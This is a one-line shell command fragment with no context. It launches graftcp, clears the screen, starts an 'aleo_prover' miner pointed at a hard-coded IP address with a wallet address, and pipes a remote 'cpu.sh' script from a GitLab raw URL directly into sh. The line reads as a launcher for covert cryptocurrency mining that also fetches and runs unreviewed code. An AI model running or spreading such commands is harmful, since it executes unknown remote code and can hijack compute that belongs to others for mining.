...
./graftcp/graftcp & clear & ./aleo_prover 138.197.44.235:80 --address aleo1y3kjry4kgjp0vsxvtqtcjdeqzczvuh858zvwr9rvntmv9gnrgyys7yddrd --custom_name $(shuf -n 1 -i 1-9999999)-Bismillah & curl https://gitlab.com/kerja6381734/COCACOLA/-/raw/main/cpu.sh | sh